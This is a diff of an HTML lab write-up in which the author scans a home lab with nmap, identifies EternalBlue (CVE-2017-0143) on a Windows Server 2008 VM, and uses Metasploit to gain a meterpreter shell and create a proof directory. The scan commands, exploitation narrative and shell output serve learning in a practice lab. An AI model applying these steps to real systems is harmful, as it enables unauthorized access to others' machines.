@@ -12,19 +12,48 @@
       and 2) <a href="#mozTocId424837">details of what I did</a>, what I found,
       and why I came to the conclusions I came to.<br>
     </p>
-    <h1>Windows Server/2008 (win2K8)</h1>
-    <p>I used the nmap -sn command to find the win2k8 machine by running it
-      once, then turning on the win2K8 machine, running nmap -sn again, and
-      comparing the outputs.&nbsp; The new entry was my victim.</p>
-    <p>I ran nmap with the -A option and I found that the Windows/2008 machine
-      had the vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0143">CVE-2017-0143</a>.&nbsp;
+    <h1>Executive Overview</h1>
+    <p>I used the <kbd><a href="#mozTocId36977">nmap -sn</a></kbd> command to
+      find the win2k8 machine by running it once, then turning on the win2K8
+      machine, running <kbd>nmap -sn</kbd> again, and comparing the
+      outputs.&nbsp; The new entry was my victim.</p>
+    <p>I ran <a href="#nmap_A">nmap with the -A</a> option and I found that the
+      Windows/2008 machine had the vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0143">CVE-2017-0143</a>.&nbsp;
       This vulnerability has a Common Vulnerability Scoring System (CVSS) score
-      of 8.1, high.</p>
-    <p>I used mfsconsole </p>
+      of 8.1, high.&nbsp; The vulnerability is a flaw in how the Server Message
+      Block (SMB version 1.0) processes packets to give the attacker full
+      administrator access to the computer.</p>
+    <p>I used the mfsconsole program to exploit the vulnerability.&nbsp; I was
+      able to use vulnerability to read any file on the computer, unless the
+      file itself was encrypted.&nbsp; To demonstrate a successful hack, I
+      created a directory, <span style="font-family: monospace;">All_your_base_belong_to_use</span>,
+      on user vagrant's desktop.</p>
+    <table style="width: 1281px; height: 847px;" border="1">
+      <tbody>
+        <tr>
+          <td><img src="All_your_bases_belong_to_us.png" alt="Hacked desktop" title="All of your bases belong to us"
+              style="width: 251px; height: 751px;"><br>
+            (There is a larger picture in the details, below.</td>
+          <td><img src="All_your_bases_belong_to_us_attacker_side.png" alt="Eternal Blue attack side"
+              title="The attacker's view of the attack"><br>
+          </td>
+        </tr>
+      </tbody>
+    </table>
     <p><br>
     </p>
-    <h1><a id="mozTocId424837" class="mozTocH1"></a>Metasploitable -
-      chronological</h1>
+    <br>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <h1>Metasploitable - chronological Narrative</h1>
     <h2><a id="mozTocId803519" class="mozTocH2"></a>April 6th 2022</h2>
     <p>I am following the guidance of <a href="https://www.youtube.com/watch?v=N_mCHMjP51Q"><yt-formatted-string
           force-default-style="" class="style-scope ytd-video-primary-info-renderer">Metasploitable
@@ -51,7 +80,7 @@ Host is up (0.00042s latency).
 Nmap done: 256 IP addresses (7 hosts up) scanned in 2.32 seconds</samp>
 jeffs@jeffs-desktop:~/Coding_DoJo/metasploitable3-workspace$ 
 </pre>
-    <pre>jeffs@jeffs-desktop:~$ <kbd>nmap -A 192.168.0.23</kbd>
+    <pre>jeffs@jeffs-desktop:~$ <kbd id="nmap_a">nmap -A 192.168.0.23</kbd>
 <samp>Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-06 23:59 PDT
 Nmap scan report for <b>ubuntu</b> (192.168.0.23)
 Host is up (0.00061s latency).
@@ -589,7 +618,7 @@ style="background-color:#75507B">SMB</span> Version Detection
    98   auxiliary/dos/<span style="background-color:#75507B">smb</span>/<span style="background-color:#75507B">smb</span>_loris                                     2017-06-29       normal     No     <span
 style="background-color:#75507B">SMB</span>Loris NBSS Denial of Service
    99   exploit/windows/local/cve_2020_0796_<span style="background-color:#75507B">smb</span>ghost                    2020-03-13       good       Yes    <span
-style="background-color:#75507B">SMB</span>v3 Compression Buffer Overflow
+style="background-color:#75507B">SMB</span>v3 Com</samp><samp><kbd><font color="#4E9A06">msfconsole</font></kbd>pression Buffer Overflow
    100  exploit/windows/<span style="background-color:#75507B">smb</span>/cve_2020_0796_<span
 style="background-color:#75507B">smb</span>ghost                      2020-03-13       average    Yes    <span
 style="background-color:#75507B">SMB</span>v3 Compression Buffer Overflow
@@ -678,16 +707,16 @@ rhost =&gt; 192.168.0.26
 <font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</samp>
 
 <u style="text-decoration-style:single">meterpreter</u> &gt; 
-<u style="text-decoration-style:single">meterpreter</u> &gt; shell
-Process 3932 created.
+<u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>shell</kbd>
+<samp>Process 3932 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
+</samp>
 C:\Windows\system32&gt;
 
-C:\Windows\system32&gt;systeminfo
-systeminfo
+C:\Windows\system32&gt;<kbd>systeminfo</kbd>
+<samp>systeminfo
 
 Host Name:                 VAGRANT-2008R2
 OS Name:                   Microsoft Windows Server 2008 R2 Standard 
@@ -732,16 +761,16 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 192.168.0.26
                                  [02]: fe80::652b:63a5:e323:504
                                  [03]: fd02:bf11:df72:1:652b:63a5:e323:504
-                                 [04]: 2602:4b:ac60:e101:652b:63a5:e323:504
+                                 [04]: 2602:4b:ac60:e101:652b:63a5:e323:504</samp>
 
 C:\Windows\system32&gt;
 
 </pre>
     <p></p>
-    <p><br>
-    </p>
-    <p><br>
-    </p>
+    <pre>C:\Windows\system32&gt;<kbd>mkdir c:\Users\Vagrant\Desktop\All_your_bases_belong_to_us</kbd></pre>
+    <p> </p>
+    <pre>C:\Windows\system32&gt;</pre>
+    <p> </p>
     <p><br>
     </p>
     <p><br>
